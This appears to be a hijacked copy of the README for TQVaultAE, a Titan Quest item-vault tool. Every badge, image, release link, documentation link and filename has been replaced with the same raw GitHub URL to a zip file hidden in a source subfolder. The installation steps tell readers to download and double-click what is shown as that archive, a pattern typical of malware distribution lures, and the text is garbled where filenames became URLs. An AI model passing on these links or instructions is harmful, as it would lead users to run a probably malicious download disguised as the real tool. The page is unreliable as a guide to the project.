# TQVaultAE
[![Steam](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip)](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip)
[![Release](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip)](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip)
[![License](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip)](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip)

TQVaultAE is an external tool for [Titan Quest Anniversary Edition](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip) that allows you to store and search your items outside the game.
Works with all expansions!

![TQVaultAE screenshot](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip "Hey, I can see my inventory from here!")
...
## Installation
### Installer
1. Navigate to the [release page](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip)
2. Download the latest release's `.exe` file.
    - **Please note:** If you opt for a pre-release, be aware that they are alpha builds.
3. Double-click the `.exe`.
4. Navigate to the folder where you installed TQVaultAE. Double-click `https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip`
5. Enjoy!
...
4. Navigate to the folder where you extracted the artefacts. Double-click `https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip`
5. Enjoy!
...
2. *Open `https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip` in a text editor (i.e. notepad, **not Microsoft Word**)*
...
- *Look up if your problem is featured in [our previously answered questions](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip+is%3Aissue+label%3Aquestion+)*
- *Look up if your problem is featured in [TQVault's documentation](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip%20common%https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip)*
- *Create an issue in [our issue tracking board](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip)*

## Contributors
This project could not go on without the continued volunteer contributions of the Titan Quest community. If you're thinking about contributing, please read our [contributing guidelines](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip).

### TQVaultAE
- [Open-source contributors](https://raw.githubusercontent.com/AirsQ/TQVaultAE/master/src/TQSaveFilesExplorer/Entities/Players/TQ-AE-Vault-3.8.zip)
